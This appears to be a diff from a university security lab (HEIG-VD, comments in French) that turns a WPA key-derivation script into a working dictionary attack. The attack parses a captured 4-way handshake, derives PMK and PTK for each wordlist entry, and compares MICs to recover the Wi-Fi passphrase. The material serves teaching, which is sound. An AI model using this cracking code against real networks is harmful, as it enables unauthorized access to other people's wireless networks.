@@ -2,15 +2,18 @@
 # -*- coding: utf-8 -*-
 
 """
-Derive WPA keys from Passphrase and 4-way handshake info
+Utilise une liste de mots pour comparer les MIC et trouver la bonne passephrase
 
-Calcule un MIC d'authentification (le MIC pour la transmission de données
-utilise l'algorithme Michael. Dans ce cas-ci, l'authentification, on utilise
-sha-1 pour WPA2 ou MD5 pour WPA)
+
+Remarque : Les variables ne sont pas mises dans le fichier custom pour cause de clareté
+           et il nous semble évident qu'un des script peut évoluer et avoir besoin
+           de définir des variables avec du contenu différent. Par conséquent il y a une petite 
+           redondance entre eux en terme de contenu. (Par exemple en utilisant une autre trame)
+           Cela nous permet d'avoir deux fichiers indépendants.
 """
 
-__author__      = "Abraham Rubinstein et Yann Lederrey"
-__copyright__   = "Copyright 2017, HEIG-VD"
+__author__      = "Abraham Rubinstein et Yann Lederrey | modified By Schranz Guillaume et Lièvre Loïc"
+__copyright__   = "Copyright 2021, HEIG-VD"
 __license__ 	= "GPL"
 __version__ 	= "1.0"
 __email__ 		= "abraham.rubinstein@heig-vd.ch"
@@ -18,24 +21,11 @@ __status__ 		= "Prototype"
 
 from scapy.all import *
 from binascii import a2b_hex, b2a_hex
-#from pbkdf2 import pbkdf2_hex
 from pbkdf2 import *
 from numpy import array_split
 from numpy import array
 import hmac, hashlib
-
-def customPRF512(key,A,B):
-    """
-    This function calculates the key expansion from the 256 bit PMK to the 512 bit PTK
-    """
-    blen = 64
-    i    = 0
-    R    = b''
-    while i<=((blen*8+159)/160):
-        hmacsha1 = hmac.new(key,A+str.encode(chr(0x00))+B+str.encode(chr(i)),hashlib.sha1)
-        i+=1
-        R = R+hmacsha1.digest()
-    return R[:blen]
+import custom 
 
 # Read capture file -- it contains beacon, authentication, associacion, handshake and data
 wpa=rdpcap("wpa_handshake.cap") 
@@ -54,7 +44,7 @@ Clientmac   = a2b_hex(packetHS1.addr1.replace(":", "")) #on recupere la mac du c
 
 # Authenticator and Supplicant Nonces
 ANonce      = packetHS1.load[13:45] #on trouve le ANonce dans le handshake 1
-SNonce      = Dot11Elt(packetHS2).load[65:97] #
+SNonce      = Dot11Elt(packetHS2).load[65:97] #on trouve le snonce dans le hadnsahke 2
 
 # This is the MIC contained in the 4th frame of the 4-way handshake
 # When attacking WPA, we would compare it to our own MIC calculated using passphrases from a dictionary
@@ -66,24 +56,27 @@ B           = min(APmac,Clientmac)+max(APmac,Clientmac)+min(ANonce,SNonce)+max(A
 #on recupere la data dans le handshake 4 et on remplace le mic du payload par 0
 data        = a2b_hex(Dot11Elt(packetHS4).load[48:].hex().replace(mic_to_test, "0"*len(mic_to_test))) #cf "Quelques détails importants" dans la donnée
 
-
 ssid = str.encode(ssid)
 
 fileWords = open("wordslist.txt", "r")
 
 for word in fileWords.readlines():
+    cleanWord = word.strip()#on nettoie le mot sinon \n fais encore partie du mot
+
     #calculate 4096 rounds to obtain the 256 bit (32 oct) PMK
-    passPhrase = str.encode(word)
+    passPhrase = str.encode(cleanWord) 
     
     pmk = pbkdf2(hashlib.sha1,passPhrase, ssid, 4096, 32)
 
     #expand pmk to obtain PTK
-    ptk = customPRF512(pmk,str.encode(A),B)
+    ptk = custom.customPRF512(pmk,str.encode(A),B)
 
     #calculate MIC over EAPOL payload (Michael)- The ptk is, in fact, KCK|KEK|TK|MICK
     mic = hmac.new(ptk[0:16],data,hashlib.sha1)
 
-    if mic == mic_to_test:
+    #on vérifie sir les deux mic sont egaux
+    if mic.hexdigest()[:-8] == mic_to_test:
+        print ("Correct passphrase : " + cleanWord)
         print ("\nResults of the key expansion")
         print ("=============================")
         print ("PMK:\t\t",pmk.hex(),"\n")
@@ -93,5 +86,9 @@ for word in fileWords.readlines():
         print ("TK:\t\t",ptk[32:48].hex(),"\n")
         print ("MICK:\t\t",ptk[48:64].hex(),"\n")
         print ("MIC:\t\t",mic.hexdigest(),"\n")
+        exit()
     else:
-        print("Wrong passphrase : " + word)
+        print("Wrong passphrase : " + cleanWord)
+
+#si on arrive ici c'est qu'aucune passphrase n'est correcte
+print("No correct passphrases found")
